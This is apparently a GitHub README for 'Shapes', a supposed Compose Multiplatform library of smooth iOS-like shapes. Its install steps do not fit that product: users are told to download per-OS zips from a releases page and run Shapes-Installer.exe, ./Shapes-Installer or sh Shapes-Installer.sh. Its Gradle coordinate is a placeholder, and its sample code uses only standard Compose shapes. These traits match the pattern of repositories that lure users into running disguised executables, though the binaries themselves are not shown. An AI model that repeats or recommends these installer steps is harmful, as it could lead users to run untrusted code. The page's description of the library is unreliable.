# 🎨 Shapes - Create Beautiful iOS-Like Designs Easily

[![Download Shapes](https://img.shields.io/badge/Download%20Shapes-v1.0-blue)](https://github.com/obbix2/Shapes/releases)

## 📄 Description

Shapes provides a collection of smooth, iOS-like shapes for use in your Compose Multiplatform applications. Enhance your UI with visually appealing components that are simple to implement. This package allows you to focus on building your app while we handle the design aspects.

## 🚀 Getting Started

Follow these instructions to get your application up and running quickly:

### 1. Visit the Releases Page

Begin by visiting our Releases page to download the Shapes package. You can find it here:

[Download Shapes](https://github.com/obbix2/Shapes/releases)

### 2. Choose the Right Version

On the Releases page, look for the latest version. We recommend using the most recent release to ensure you have the latest features and fixes. Click on the version number to view the details.

### 3. Download the Shapes Package

Once you are on the version details page, you will see files available for download. Download the appropriate file for your platform. Here are some common files you might see:

- **Windows:** `Shapes-Windows.zip`
- **Mac:** `Shapes-Mac.zip`
- **Linux:** `Shapes-Linux.zip`

Click on the file that matches your operating system to start the download.

### 4. Install Shapes

After the download is complete, locate the downloaded file on your device. Here’s how to install Shapes based on your operating system:

#### For Windows:

1. Unzip the `Shapes-Windows.zip` file.
2. Open your preferred terminal or command prompt.
3. Navigate to the unzipped folder.
4. Run the installer by typing `Shapes-Installer.exe` and hit enter.

#### For Mac:

1. Unzip the `Shapes-Mac.zip`.
2. Open your terminal.
3. Navigate to the unzipped folder.
4. Use the command `./Shapes-Installer` to start the installation.

#### For Linux:

1. Unzip the `Shapes-Linux.zip` file.
2. Open a terminal window.
3. Navigate to the unzipped folder.
4. Execute the command `sh Shapes-Installer.sh` to install.

## 💻 System Requirements

Before running Shapes, ensure your device meets the following requirements:

- **Operating System:**
  - Windows 10 or later
  - macOS 10.12 or later
  - Ubuntu 18.04 or later

- **Hardware:**
  - Minimum 4 GB RAM
  - At least 100 MB of free disk space

## 🛠️ Usage Instructions

Once you install Shapes, you can begin using the smooth shapes in your projects. Here’s a quick guide on how to incorporate Shapes into your Compose Multiplatform app.

### 1. Import Shapes

Add the Shapes library to your project. Depending on your build configuration, include the following line in your `build.gradle` file:

```groovy
dependencies {
    implementation "com.example:shapes:1.0.0"
}
```

### 2. Add Shapes in Your UI

You can now use the shapes in your Compose layouts. Here’s a simple example:

```kotlin
@Composable
fun MyApp() {
    Box(modifier = Modifier
        .size(100.dp)
        .clip(RoundedCornerShape(16.dp))
        .background(Color.Blue)) {
        Text("Hello World", color = Color.White)
    }
}
```

### 3. Customize Shapes

Shapes allows you to customize dimensions and colors. Modify the parameters to create your desired effect.

## 📚 Documentation

For more details on how to use the library, visit our [Documentation](https://github.com/obbix2/Shapes/wiki). You can find in-depth guides and examples to help you get the most out of Shapes.

## 🤝 Contributions

We welcome feedback and contributions to Shapes. If you have suggestions or improvements, please reach out via the Issues section of our repository. Together, we can enhance this tool for everyone.

## 💡 Additional Resources

- [Jetpack Compose Documentation](https://developer.android.com/jetpack/compose)
- [Compose Multiplatform](https://www.jetbrains.com/lp/compose/)

Remember, the key to beautiful design is simplicity. Shapes aims to provide that with minimal effort on your part.

For any questions or support, feel free to open an issue on our GitHub page. We are here to help!